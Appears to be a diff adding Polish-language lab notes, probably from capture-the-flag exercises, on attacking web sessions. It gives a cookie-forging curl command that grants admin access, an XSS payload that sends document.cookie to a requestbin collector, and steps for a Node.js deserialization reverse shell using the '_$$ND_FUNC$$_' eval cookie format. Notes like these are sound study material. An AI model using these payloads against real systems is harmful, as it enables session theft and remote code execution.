@@ -1,0 +1,36 @@
+1) Strony internetowe
+      • Przetwarzanie ciasteczka sesyjnego typu Bayera
+            ▪ https://jwt.io/#debugger-io
+            ▪ https://gchq.github.io/CyberChef/
+        
+2) Podmiana danych
+      • Zamiana roli uzytkownika
+            ▪ z user na admin
+            ▪ curl -H "Cookie: logged_in=true; admin=true" http://10.10.239.130/cookie-test
+
+3) Wstrzykniecie kodu
+      • Wysylajacego ciasteczko do zewnetrznego servera
+            ▪ https://requestbin.com 
+            ▪ <img src=x onerror=this.src="<ADRES Z REQESTBIN>/?c="+document.cookie>
+
+4) Manipulacja w zakladkach developerskich przegladarki
+      • Network
+            ▪ Mozliwa podmiana id usera
+
+5) Wstyrzkniecie revershella javascript (deserializacja) (Node) (eval)
+      • Skrypt do wygenerowania funkcji
+            ▪ https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py
+      • Generowanie funkcji (eval)
+            ▪ python2 script.py 10.8.190.238 4444
+      • Przyklad formatu cookie przed kodowaniem
+            ▪ {"rce":"_$$ND_FUNC$$_function (){ eval() }()"}
+      • Kodujemy (base64)
+            ▪ Podmieniamy na stronie ustawiamy sluchacza i odswiezamy strone
+
+
+
+
+
+
+    
+    
